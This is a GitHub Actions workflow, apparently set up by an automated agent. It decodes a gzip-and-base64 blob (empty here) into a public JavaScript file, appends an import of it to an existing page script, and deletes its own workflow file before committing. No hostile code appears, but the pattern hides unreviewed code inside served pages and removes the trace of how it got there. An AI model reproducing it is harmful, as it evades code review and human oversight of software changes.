name: Apply automation test center

on:
  push:
    branches:
      - agent/automation-test-center

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: Checkout feature branch
        uses: actions/checkout@v4
        with:
          ref: agent/automation-test-center
          fetch-depth: 0

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '24'
          cache: npm

      - name: Generate centralized test module
        env:
          AUTOMATION_TESTS_GZIP_BASE64: |
            
        run: |
          python - <<'PY'
          import base64
          import gzip
          import os
          from pathlib import Path

          root = Path('.')
          encoded = ''.join(os.environ['AUTOMATION_TESTS_GZIP_BASE64'].split())
          content = gzip.decompress(base64.b64decode(encoded))
          (root / 'public' / 'automation-tests.js').write_bytes(content)

          loader = root / 'public' / 'friendly-panel.js'
          text = loader.read_text(encoding='utf-8')
          import_line = "void import('./automation-tests.js');"
          if import_line not in text:
              loader.write_text(text.rstrip() + '\n' + import_line + '\n', encoding='utf-8')

          (root / '.github' / 'workflows' / 'apply-automation-test-center.yml').unlink(missing_ok=True)
          PY

      - name: Install dependencies
        run: npm ci

      - name: Validate project
        run: npm run check

      - name: Commit generated feature
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          if ! git diff --cached --quiet; then
            git commit -m "feat: add centralized automation test center"
            git push origin HEAD:agent/automation-test-center
          fi
